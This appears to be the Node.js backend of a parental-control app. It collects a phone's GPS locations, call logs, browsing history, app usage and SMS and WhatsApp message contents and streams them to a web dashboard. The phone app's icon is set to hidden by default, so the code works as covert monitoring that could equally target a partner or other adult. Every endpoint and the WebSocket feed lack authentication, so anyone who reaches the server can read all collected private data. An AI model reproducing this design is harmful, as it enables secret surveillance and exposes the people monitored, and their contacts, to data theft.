const express = require('express');
const cors = require('cors');
const http = require('http');
const { WebSocketServer, WebSocket } = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

// Log incoming API calls
app.use('/api', (req, res, next) => {
  console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.url} - Body:`, JSON.stringify(req.body));
  next();
});

// Serve built Parent Web Dashboard directly from public folder
const publicPath = path.join(__dirname, 'public');
if (fs.existsSync(publicPath)) {
  app.use(express.static(publicPath));
}

// Data Store File Path (use /tmp on Vercel/serverless environments)
const DATA_FILE = fs.existsSync('/tmp') ? path.join('/tmp', 'data_store.json') : path.join(__dirname, 'data_store.json');

// Initialize DB structure for child data
let db = {
  deviceStatus: {
    deviceId: 'child-device',
    childName: 'جهاز الطفل',
    deviceModel: 'بانتظار توصيل هاتف الطفل...',
    androidVersion: '-',
    batteryLevel: 0,
    isCharging: false,
    isOnline: false,
    hideAppIcon: true,
    lastSeen: new Date().toISOString()
  },
  locations: [],
  calls: [],
  appUsage: [],
  webHistory: [],
  messages: [],
  blockedRules: {
    websites: [],
    apps: [],
    numbers: []
  }
};

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      const loaded = JSON.parse(raw);
      db = {
        ...db,
        ...loaded,
        deviceStatus: { ...db.deviceStatus, ...(loaded.deviceStatus || {}) },
        blockedRules: { ...db.blockedRules, ...(loaded.blockedRules || {}) }
      };
    }
  } catch (e) {
    console.error('Error loading data:', e);
  }
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));
  } catch (e) {
    console.error('Error saving data:', e);
  }
}

// Initial load
loadData();

// Create HTTP Server & WebSocket
const server = http.createServer(app);
const wss = new WebSocketServer({ server });


function broadcastToParents(type, payload) {
  const message = JSON.stringify({ type, payload });
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}

wss.on('connection', (ws) => {
  console.log('Parent Dashboard WebSocket connected');
  ws.send(JSON.stringify({ type: 'INIT_STATE', payload: db }));
});

// --- TELEMETRY ROUTES (CALLED BY CHILD ANDROID APP) ---

app.post('/api/telemetry/device-ping', (req, res) => {
  const { deviceId, batteryLevel, isCharging, deviceModel, androidVersion } = req.body;
  db.deviceStatus = {
    ...db.deviceStatus,
    deviceId: deviceId || db.deviceStatus.deviceId,
    batteryLevel: batteryLevel !== undefined ? batteryLevel : db.deviceStatus.batteryLevel,
    isCharging: isCharging !== undefined ? isCharging : db.deviceStatus.isCharging,
    deviceModel: deviceModel || db.deviceStatus.deviceModel,
    androidVersion: androidVersion || db.deviceStatus.androidVersion,
    isOnline: true,
    lastSeen: new Date().toISOString()
  };
  saveData();
  broadcastToParents('DEVICE_STATUS_UPDATE', db.deviceStatus);
  res.json({ status: 'ok', blockedRules: db.blockedRules, hideAppIcon: db.deviceStatus.hideAppIcon });
});

function getDistanceMeters(lat1, lon1, lat2, lon2) {
  const R = 6371000;
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

async function fetchReverseGeocode(lat, lng) {
  try {
    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=ar`, {
      headers: { 'User-Agent': 'ParentalControlApp/1.0' }
    });
    if (res.ok) {
      const data = await res.json();
      const addr = data.address || {};
      const road = addr.road || addr.pedestrian || addr.suburb || addr.neighbourhood || '';
      const suburb = addr.suburb || addr.city_district || addr.district || addr.quarter || '';
      const city = addr.city || addr.town || addr.state || '';
      const parts = [road, suburb, city].filter(Boolean);
      if (parts.length > 0) return parts.join('، ');
    }
  } catch (e) {}
  return null;
}

app.post('/api/telemetry/location', async (req, res) => {
  loadData();
  const { lat, lng, speed, batteryLevel, address } = req.body;
  if (!lat || !lng) return res.status(400).json({ error: 'Missing lat/lng' });

  const parsedLat = parseFloat(lat);
  const parsedLng = parseFloat(lng);
  const speedKm = Math.round(speed || 0);

  let finalAddress = (address && address.trim().length > 0) ? address.trim() : null;
  if (!finalAddress || finalAddress.startsWith('الموقع الحالي')) {
    const fetched = await fetchReverseGeocode(parsedLat, parsedLng);
    finalAddress = fetched || `الموقع الجغرافي (${parsedLat.toFixed(4)}, ${parsedLng.toFixed(4)})`;
  }

  const now = new Date();
  let isDuplicate = false;

  if (db.locations.length > 0) {
    const last = db.locations[0];
    const distMeters = getDistanceMeters(parsedLat, parsedLng, last.lat, last.lng);
    const timeDiffSec = (now - new Date(last.timestamp)) / 1000;
    // If phone hasn't moved more than 15 meters within 3 minutes, update timestamp & battery only
    if (distMeters < 15 && timeDiffSec < 180) {
      isDuplicate = true;
      last.timestamp = now.toISOString();
      last.batteryLevel = batteryLevel || db.deviceStatus.batteryLevel;
      last.speed = speedKm;
      if (finalAddress && !finalAddress.startsWith('الموقع الجغرافي')) {
        last.address = finalAddress;
      }
    }
  }

  const newLoc = {
    id: db.locations.length + 1,
    lat: parsedLat,
    lng: parsedLng,
    speed: speedKm,
    address: finalAddress,
    batteryLevel: batteryLevel || db.deviceStatus.batteryLevel,
    timestamp: now.toISOString()
  };

  if (!isDuplicate) {
    db.locations.unshift(newLoc);
    if (db.locations.length > 500) db.locations.pop();
  }

  db.deviceStatus.lastSeen = now.toISOString();
  db.deviceStatus.isOnline = true;
  saveData();

  broadcastToParents('NEW_LOCATION', isDuplicate ? db.locations[0] : newLoc);
  res.json({ status: 'ok' });
});


app.post('/api/telemetry/calls', (req, res) => {
  const { phoneNumber, contactName, type, durationSeconds } = req.body;
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });

  const mins = Math.floor((durationSeconds || 0) / 60);
  const secs = (durationSeconds || 0) % 60;
  const durationStr = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;

  const newCall = {
    id: db.calls.length + 1,
    phoneNumber,
    contactName: contactName || 'غير معروف',
    type: type || 'INCOMING',
    duration: durationStr,
    durationSeconds: durationSeconds || 0,
    timestamp: new Date().toISOString()
  };

  db.calls.unshift(newCall);
  saveData();

  broadcastToParents('NEW_CALL', newCall);
  res.json({ status: 'ok' });
});

app.post('/api/telemetry/app-usage', (req, res) => {
  const { apps } = req.body;
  if (Array.isArray(apps)) {
    db.appUsage = apps;
    saveData();
    broadcastToParents('APP_USAGE_UPDATE', db.appUsage);
  }
  res.json({ status: 'ok' });
});

app.post('/api/telemetry/web-history', (req, res) => {
  const { url, title, browser } = req.body;
  if (!url) return res.status(400).json({ error: 'Missing URL' });

  const domain = new URL(url).hostname.replace('www.', '');
  const isBlocked = db.blockedRules.websites.some(b => domain.includes(b));

  const newWebItem = {
    id: db.webHistory.length + 1,
    url,
    title: title || domain,
    browser: browser || 'Chrome',
    timestamp: new Date().toISOString(),
    isBlocked
  };

  db.webHistory.unshift(newWebItem);
  saveData();

  broadcastToParents('NEW_WEB_VISIT', newWebItem);
  res.json({ status: 'ok', isBlocked });
});

app.post('/api/telemetry/messages', (req, res) => {
  const { app: appName, sender, body, timestamp, type, messages } = req.body;
  if (!db.messages) db.messages = [];
  
  if (Array.isArray(messages)) {
    messages.forEach(msg => {
      const newItem = {
        id: db.messages.length + 1,
        app: msg.app || 'SMS',
        sender: msg.sender || 'غير معروف',
        body: msg.body || '',
        type: msg.type || 'INCOMING',
        timestamp: msg.timestamp || new Date().toISOString()
      };
      db.messages.unshift(newItem);
    });
  } else if (sender || body) {
    const newItem = {
      id: db.messages.length + 1,
      app: appName || 'WhatsApp',
      sender: sender || 'غير معروف',
      body: body || '',
      type: type || 'INCOMING',
      timestamp: timestamp || new Date().toISOString()
    };
    db.messages.unshift(newItem);
    broadcastToParents('NEW_MESSAGE', newItem);
  }

  if (db.messages.length > 500) db.messages = db.messages.slice(0, 500);
  db.messages.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
  saveData();
  res.json({ status: 'ok' });
});

// --- PARENT DASHBOARD REST API ENDPOINTS ---

app.get('/api/parent/all-data', (req, res) => {
  loadData();
  res.json(db);
});


app.post('/api/parent/clear-data', (req, res) => {
  db.locations = [];
  db.calls = [];
  db.appUsage = [];
  db.webHistory = [];
  saveData();
  broadcastToParents('INIT_STATE', db);
  res.json({ status: 'ok' });
});

app.post('/api/parent/blocked-rules', (req, res) => {
  const { action, type, value } = req.body;
  if (!db.blockedRules[type]) db.blockedRules[type] = [];
  if (action === 'add' && !db.blockedRules[type].includes(value)) {
    db.blockedRules[type].push(value);
  } else if (action === 'remove') {
    db.blockedRules[type] = db.blockedRules[type].filter(item => item !== value);
  }
  saveData();
  broadcastToParents('BLOCKED_RULES_UPDATE', db.blockedRules);
  res.json({ status: 'ok', blockedRules: db.blockedRules });
});

app.post('/api/parent/toggle-app-icon', (req, res) => {
  const { hide } = req.body;
  db.deviceStatus.hideAppIcon = !!hide;
  saveData();
  broadcastToParents('DEVICE_STATUS_UPDATE', db.deviceStatus);
  res.json({ status: 'ok', hideAppIcon: db.deviceStatus.hideAppIcon });
});

app.delete('/api/parent/messages/:id', (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (db.messages) {
    db.messages = db.messages.filter(m => m.id !== id);
    saveData();
    broadcastToParents('INIT_STATE', db);
  }
  res.json({ status: 'ok', messages: db.messages });
});

app.post('/api/parent/clear-messages', (req, res) => {
  const { app: appFilter } = req.body || {};
  if (appFilter && appFilter !== 'all') {
    db.messages = (db.messages || []).filter(m => m.app !== appFilter);
  } else {
    db.messages = [];
  }
  saveData();
  broadcastToParents('INIT_STATE', db);
  res.json({ status: 'ok', messages: db.messages });
});


// Fallback to serve index.html for Parent Dashboard Single-Page App
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api')) return next();
  const indexPath = path.join(__dirname, 'public', 'index.html');
  if (fs.existsSync(indexPath)) {
    return res.sendFile(indexPath);
  }
  res.send('Parental Control Backend Server is Running');
});

// Start Server on 0.0.0.0 (all network interfaces) if run directly
if (require.main === module) {
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`Parental Control Backend & UI running on http://0.0.0.0:${PORT}`);
    console.log(`WebSocket Server ready on ws://0.0.0.0:${PORT}`);
  });
}

module.exports = app;
